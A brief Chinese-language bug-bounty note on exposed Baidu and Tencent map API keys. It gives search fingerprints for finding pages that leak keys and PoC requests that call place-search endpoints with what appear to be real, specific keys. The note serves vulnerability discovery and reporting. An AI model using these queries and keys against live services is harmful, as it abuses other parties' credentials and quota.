地图 API 接管漏洞会导致该 Key 被出售给其它开发者或恶意消耗 API;

将会导致地图加载异常，显示报错信息, 无法获取使用者的地理定位等.

## 1. 百度地图

### 1.1. 特征

```
https://api.map.baidu.com/api?v=1.0&&type=webgl&ak=SA1vncDqp8vNAVIn1WUGIQkE7G5cDdbP
```

```
web.body="https://api.map.baidu.com/api?v=webgl"&&web.body="&&type="&&web.body="&ak="
```



### 1.2. PoC

```
https://api.map.baidu.com/place/v2/search?query=ATM&tag=银行&region=上海&output=json&ak=SA1vncDqp8vNAVIn1WUGIQkE7G5cDdbP
```

## 2. 腾讯地图

### 2.1. 特征

```
https://map.qq.com/api/gljs?v=1.exp&key=DKCBZ-SYCCU-OZ2VP-2ES3Z-ZQHQ6-6FFW6
```

### 2.2. PoC

```
https://apis.map.qq.com/ws/place/v1/search?keyword=银行&boundary=nearby(31.2304,121.4737,1000)&key=DKCBZ-SYCCU-OZ2VP-2ES3Z-ZQHQ6-6FFW6
```

---

- [“地图API后台配置错误”:挖SRC的新玩具？](https://www.freebuf.com/articles/web/360331.html)

